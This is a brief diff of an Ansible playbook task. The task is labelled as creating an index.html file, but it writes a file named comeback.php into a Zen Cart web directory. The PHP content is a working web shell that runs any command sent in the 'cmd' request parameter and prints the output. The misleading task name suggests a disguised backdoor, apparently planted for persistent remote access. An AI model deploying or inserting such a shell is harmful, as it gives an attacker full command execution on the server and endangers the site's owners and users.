@@ -9,5 +9,4 @@
   - name: Create index.html file
     copy:
       dest: /var/www/html/zen-cart/comeback.php
-      content: |
-<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
+      content: <?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
